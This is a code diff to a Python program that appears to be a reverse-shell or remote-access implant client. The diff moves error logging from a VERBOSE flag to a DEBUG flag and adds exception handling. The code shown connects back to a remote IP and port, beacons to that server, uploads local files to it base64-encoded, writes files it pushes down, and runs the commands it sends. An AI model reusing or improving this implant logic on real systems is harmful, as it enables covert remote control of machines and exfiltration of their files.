@@ -186,7 +186,7 @@ def base64_encode(message):
         base64_message = base64_bytes.decode('ascii')
         return base64_message
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     
@@ -215,16 +215,21 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
             print_fail("IO Error, Unable to Read File for Transfer")
     if VERBOSE:
         print_info("Sending File: " + file_name)
-    while data:
-        b64_data = base64_encode(data)
+    try:
+        while data:
+            b64_data = base64_encode(data)
+            if DEBUG:
+                print(b64_data)
+            conn.send(b64_data.encode())
+            data = f.read(1024)
+        conn.send("[END]".encode('utf-8'))
+        if VERBOSE:
+            print_info("Done!")
+        f.close()
+    except Exception as e:
         if DEBUG:
-            print(b64_data)
-        conn.send(b64_data.encode())
-        data = f.read(1024)
-    conn.send("[END]".encode('utf-8'))
-    if VERBOSE:
-        print_info("Done!")
-    f.close()
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
     file_name = file_name.rstrip("[END]")
@@ -244,7 +249,7 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
                 f.write(data)
         f.close()
     except:
-        if VERBOSE:
+        if DEBUG:
             print_fail("IO Error - Unable to Write File from Server")
             send_data(conn, "INVALID DESTINATION PATH")
 
@@ -263,7 +268,7 @@ def change_cwd(path):
         chdir(path)
         get_cwd()
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     return CURRENT_WORKING_DIR
@@ -286,7 +291,7 @@ def beacon(conn, data):
             BEACON_INTERVAL_MEM = None
             raise ConnectionResetError
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
@@ -297,7 +302,7 @@ def kill_term(conn):
         conn.close()
         kill(getpid(), SIGTERM)
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
@@ -311,7 +316,7 @@ def callback_port(conn,data):
             if int(temp) > 0 and int(temp) < 65536:
                 remote_port = int(temp)
         except Exception as e:
-            if VERBOSE:
+            if DEBUG:
                 print_fail("Unable to change callback port")
                 print(e)
 
@@ -341,8 +346,9 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     except ConnectionRefusedError:
         raise ConnectionRefusedError
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     sock_desc_tracker = []
     try:
         while True:
@@ -433,13 +439,13 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                             print_warn("Command Execution Timeout Expired")
                         send_data(conn, "Command Execution Timeout Expired")
                     except Exception as e:
-                        if VERBOSE:
+                        if DEBUG:
                             print_fail("Exception! --> {}".format(e))
                             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                         send_data(conn,e)
                 data = "" #reset the data received
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
@@ -508,13 +514,13 @@ def main():
                 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
             else:
                 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
-            if VERBOSE:
+            if DEBUG:
                 print_fail("Remote end terminated the connection")
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionAbortedError:
             exit()
         except Exception as e:
-            if VERBOSE:
+            if DEBUG:
                 print(e)
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         finally:
@@ -540,6 +546,6 @@ def main():
 try:
     main()
 except:
-    if VERBOSE:
+    if DEBUG:
         print(exc_info())
         print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
